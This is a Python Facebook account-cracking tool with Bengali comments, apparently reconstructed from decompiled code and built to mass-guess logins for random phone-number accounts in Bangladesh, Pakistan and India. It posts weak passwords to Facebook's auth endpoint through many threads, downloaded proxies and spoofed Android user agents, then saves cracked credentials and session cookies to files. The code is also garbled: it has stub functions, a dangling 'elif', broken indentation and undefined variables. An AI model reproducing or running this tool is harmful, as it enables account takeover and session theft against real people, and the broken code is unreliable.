import os, sys, time, random, uuid, json, requests, re, zlib, marshal, base64, string
from concurrent.futures import ThreadPoolExecutor

# রঙ এবং টেক্সট ফরম্যাট
G1 = '\x1b[1;97m' # সাদা
G2 = '\x1b[38;5;46m' # সবুজ
G4 = '\x1b[1;31m' # লাল

def clear():
    os.system('clear')
    print(logo)

logo = """
 ███████ ██ ███████  █████  ████████ 
 ██      ██ ██      ██   ██    ██    
 ███████ ██ █████   ███████    ██    
      ██ ██ ██      ██   ██    ██    
 ███████ ██ ██      ██   ██    ██    
-----------------------------------------
 OWNER      : SHAHIN MOJUMDER
 GITHUB     : w8Shahin
 TOOL       : RANDOM / PAID
-----------------------------------------"""

# রেজাল্ট কাউন্টার এবং গ্লোবাল স্টেট
ok = 0        # সফল আইডির সংখ্যা রাখার জন্য
cp = 0        # চেকপয়েন্ট আইডির সংখ্যা রাখার জন্য
loop = 0      # কতগুলো আইডি চেক হয়েছে তা গুনতে
twf = 0       # Two-factor অথেন্টিকেশন আইডির জন্য
id = []       # আইডির লিস্ট জমা রাখার জন্য
plist = []    # পাসওয়ার্ড লিস্টের জন্য
methods = []  # মেথড স্টোর করার জন্য
proxs = []    # প্রক্সি লিস্ট রাখার জন্য

# কালার কোডসমূহ (ব্যানার ও টেক্সটের জন্য)
G1 = '\x1b[1;97m'  # White
G2 = '\x1b[38;5;46m' # Green
G4 = '\x1b[1;31m'    # Red
G3 = '\x1b[1;32m'    # Light Green
G5 = '\x1b[1;92m'    # Bright Green
Y = '\x1b[1;93m'     # Yellow
T = '\x1b[1;94m'     # Blue
O = '\x1b[1;96m'     # Cyan
BL = '\x1b[1;90m'    # Grey

def update():
    try:
        # গিটহাব থেকে ভার্সন ফাইল চেক করা
        ver_check = requests.get("https://raw.githubusercontent.com/SIFAT-VAI143/version/main/ver.txt").text
        current_ver = "1.5" # এই টুলের বর্তমান ভার্সন
        
        if current_ver not in ver_check:
            print("[*] Updating Tool...")
            os.system("git pull")
            print("[*] Update Done. Please Restart.")
            sys.exit()
    except:
        pass

# বাইটকোডের source: 11 অনুযায়ী
def get_proxies():
    try:
        # প্রক্সিস্ক্রেপ থেকে লেটেস্ট SOCKS4 প্রক্সি ডাউনলোড করা
        proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all"
        os.system(f'curl -s "{proxy_url}" > socksku.txt')
        print("[*] Proxies downloaded successfully!")
    except Exception as e:
        print("[!] Proxy download failed.")

def ugen():
    # এখানে শত শত Samsung ডিভাইসের লিস্ট আছে
    device_list = ['GT-1015', 'GT-1020', 'SM-G950F', 'SM-J701F'] # সংক্ষেপিত
    android_version = str(random.randint(4, 13))
    fb_version = f"{random.randint(100, 400)}.0.0.{random.randint(1, 20)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {random.choice(device_list)} Build/QP1A) [FBAN/FB4A;FBAV/{fb_version};]"
    return ua

# বাইটকোডের source: 72 এবং 99 অনুযায়ী
def dalvik_ua_pro():
    # এটি মূলত Xiaomi/Redmi ডিভাইসের ডেটা ফেক করার একটি লজিক
    dalvik_ver = "2.1.0"
    android_ver = "9"
    model = "Redmi Note 8T"
    build = "QP1A.190711.020"
    
    ua = f"Dalvik/{dalvik_ver} (Linux; U; Android {android_ver}; {model} Build/{build}) " \
         f"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{{density=3.3,width=1080,height=1430}};FBLC/en_GB;FBRV/859351995;FBCR/AT&T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua
    
     # বাইটকোডের লজিক অনুযায়ী পাসওয়ার্ড লিস্টের এক্সটেনশন
def get_psw(uid, number):
    ...
    return psw

def handle_cookies(res_headers, uid):
    ...
    
    first_six = number[:6]
    last_six = number[-6:]
    name_list = ["shahin123", "shahin786", "shahin123", "786786", "11223344"]
    
    psw = [uid, number, first_six, last_six] + name_list
    
    try:
        # ফেসবুক রেসপন্স থেকে কুকি স্ট্রিং বের করা
        cookie_data = res_headers.get('set-cookie', '')
        if 'c_user' in cookie_data:
            # Regular Expression দিয়ে c_user এবং xs খুঁজে বের করা
            c_user = re.findall('c_user=(.*?);', cookie_data)[0]
            xs = re.findall('xs=(.*?);', cookie_data)[0]
            
            # পূর্ণাঙ্গ কুকি ফরম্যাট তৈরি
            full_cookie = f"c_user={c_user};xs={xs};"
            
            # কুকি ফাইলে সেভ করা
            open('/sdcard/SIFAT-DATA/SIFAT-COOKIE.txt', 'a').write(f"{uid}|{full_cookie}\n")
            return full_cookie
    except:
        return None

def build_headers(ua):
    headers = {
        "User-Agent": ua,
        "X-FB-Friendly-Name": "authenticate",
        "X-FB-Connection-Bandwidth": str(random.randint(20000, 40000)),
        "X-FB-Net-HNI": str(random.randint(10000, 99999)),
        "X-FB-SIM-HNI": str(random.randint(10000, 99999)),
        "X-FB-Connection-Type": "unknown",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-FB-HTTP-Engine": "Liger"
    }
    return headers
    
    # লগইন ফাংশনের ভেতরের রেসপন্স চেকিং লজিক
def login_multi(uid, psw_list, ua):
    global ok, cp, loop
    for pw in psw_list:
        # API তে রিকোয়েস্ট পাঠানোর পর...
        response = ... # (পার্ট ৪-এ দেওয়া API রিকোয়েস্ট লজিক)
        
        # ১. যদি সেশন কি পাওয়া যায় (সফল লগইন/OK)
        if 'session_key' in response:
            print(f"\r\x1b[1;92m[SIFAT-OK] {uid} | {pw}\x1b[0m")
            
            # কুকি (Cookies) বের করার পদ্ধতি
            cookies = ";".join([f"{key}={value}" for key, value in response.get("session_cookies", {}).items()])
            print(f"\r\x1b[1;97m[🍪] COOKIES : {cookies}")
            
            # ভয়েস অ্যালার্ট এবং ফাইল সেভ
            os.system('espeak -a 300 "ok id"')
            open('/sdcard/SIFAT-OK.txt', 'a').write(f"{uid}|{pw}\n")
            ok += 1
            break
            
        # ২. যদি চেকপয়েন্ট (Checkpoint/CP) আসে
        elif 'error_detail_type' in response and response['error_detail_type'] == 'checkpoint':
            print(f"\r\x1b[1;93m[SIFAT-CP] {uid} | {pw}\x1b[0m")
            
            os.system('espeak -a 300 "cp id"')
            open('/sdcard/SIFAT-CP.txt', 'a').write(f"{uid}|{pw}\n")
            cp += 1
            break
            
        # ৩. যদি টু-ফ্যাক্টর অথেনটিকেশন (2FA) থাকে
        elif 'error_detail_type' in response and response['error_detail_type'] == 'two_factor':
            print(f"\r\x1b[1;95m[shahin-2F] {uid} | {pw}\x1b[0m")
            
            os.system('espeak -a 300 "two,f id"')
            open('/sdcard/shahin-2F.txt', 'a').write(f"{uid}|{pw}\n")
            break

def handle_response(res, uid, pw):
    global ok, cp
    # সেশন কি (Session Key) থাকলে আইডি OK
    if "session_key" in res:
        ok += 1
        # espeak দিয়ে সাউন্ড অ্যালার্ট
        os.system('espeak -a 300 "ok id"')
        
        # কুকি ম্যানেজমেন্ট পার্ট কল করা
        cookie = handle_cookies(res.get('session_cookies', {}), uid)
        
        print(f"\r\033[1;32m[SIFAT-OK] {uid} | {pw}")
        if cookie:
            print(f"\033[1;37m[🍪] COOKIE : {cookie}")
            
        # ডাটা সেভ করা
        save_path = '/sdcard/SIFAT-DATA/SIFAT-OK.txt'
        with open(save_path, 'a') as f:
            f.write(f"{uid}|{pw}|{cookie}\n")
            
    # চেকপয়েন্ট হলে CP সেকশন
    elif "error" in res and "checkpoint" in str(res):
        cp += 1
        print(f"\r\033[1;91m[SIFAT-CP] {uid} | {pw}")
        open('/sdcard/SIFAT-DATA/SIFAT-CP.txt', 'a').write(f"{uid}|{pw}\n")

def rmenu1():
    clear()
    print("[A] RANDOM CRACK BANGLADESH")
    print("[B] RANDOM CRACK PAKISTAN")
    print("[C] RANDOM CRACK INDIA")
    choice = input("Choice : ")
    
    if choice in ['A', 'a']:
        # বাংলাদেশ সিম কোড সিলেকশন
        print("BD SIM CODE: 017 015 018 019 013 016")
        code = input("Choice : ")
        limit = int(input("LIMIT: 10000, 20000, 50000: "))
        # ক্লোনিং প্রসেস শুরু
        BDXr(code, limit)

def Main():
    os.system('clear')
    print(logo)
    print(f' [{G2}1{G1}] FILE CRACK')
    print(f' [{G2}2{G1}] RANDOM CRACK')
    print(f' [{G2}3{G1}] CONTACT OWNER')
    print(f' [{G2}0{G1}] EXIT')
    print(f'{G1} {42*"—"}')
    
    choice = input(f' {G1}[{G2}•{G1}] Choice : ')
    
    if choice in ['1', '01']:
     pass
  
def file_crack_menu():
    pass
    elif choice in ['2', '02']:
        # র‍্যান্ডম ক্র্যাক সেকশন
        rmenu1()
    elif choice in ['3', '03']:
        # কন্টাক্ট সেকশন
        os.system('xdg-open https://wa.me/+88017XXXXXXXX') # আপনার নাম্বার অনুযায়ী
    elif choice in ['0', '00']:
        sys.exit()
    else:
        print(f' {G4}[!] CHOOSE VALID OPTION');time.sleep(1)
        Main()

def BDXr(code, limit):
    clear()
    print(logo)
    print(f"[*] TOTAL ID : {limit}")
    print(f"[*] SIM CODE : {code}")
    print("[*] THE PROCESS HAS BEEN STARTED")
    print("[*] USE AEROPLANE MODE IN EVERY 5 MIN")
    print(45 * "-")

    # মাল্টি-থ্রেডিং ব্যবহার করে একসাথে অনেকগুলো রিকোয়েস্ট পাঠানোর লজিক
    with ThreadPoolExecutor(max_workers=60) as ghx:
        for _ in range(int(limit)):
            # 0 থেকে 9 পর্যন্ত সংখ্যা দিয়ে ৭ ডিজিটের র‍্যান্ডম নাম্বার তৈরি
            number = ''.join(random.choice(string.digits) for _ in range(7))
            uid = code + number # যেমন: 017 + 1234567
            
            # সম্ভাব্য পাসওয়ার্ডের একটি লিস্ট তৈরি করা (Password Array)
            psw_list = [
                uid,                   # সম্পূর্ণ নাম্বার (0171234567)
                number,                # শেষের ৭ ডিজিট (1234567)
                code + number[:4],     # কোড + নাম্বারের প্রথম ৪ ডিজিট
                "bangladesh",
                "free fire"
            ]
            
            # থ্রেড পুলে লগইন ফাংশন পাঠানো
for pw in psw_list:
          ghx.submit(login, uid, pw, ugen())

def login(email, password, user_agent):
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "adid": str(uuid.uuid4()),
        "email": email,
        "password": password,
        "format": "json",
        "device_id": str(uuid.uuid4()),
        "locale": "en_GB",
        "client_country_code": "GB",
        "fb_api_req_friendly_name": "authenticate"
    }
    headers = {
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-FB-HTTP-Engine": "Liger"
    }
    response = requests.post(url, data=data, headers=headers).json()
    
    if "session_key" in response:
        print(f"[SHAHIN-OK] {email} | {password}")
        open("/sdcard/SHAHIN-OK.txt", "a").write(f"{email}|{password}\n")
    elif "error_detail_type" in response and response["error_detail_type"] == "checkpoint":
        print(f"[SHAHIN-CP] {email} | {password}")

# বাইটকোডের source: 13 এবং 64 অনুযায়ী
def INDX(code, limit):
    # ভারতের সিম কোড: 9670, 9725, 8948, 8795, 6383
    # লজিক বাংলাদেশের BDXr মেথডের মতোই, শুধু ডিজিট সংখ্যা আলাদা
    pass

def PAKX(code, limit):
    pass

def end():
    print(45 * "-")
    print(f"[*] TOTAL OK : {ok}")
    print(f"[*] TOTAL CP : {cp}")
    print("[*] PROCESS COMPLETED")
    print(45 * "-")
    input("[*] PRESS ENTER TO BACK")
    rmenu1()

if __name__ == '__main__':
    try:
        os.system('mkdir -p /sdcard')
        rmenu1()
    except Exception as e:
        print(f"Error: {e}")
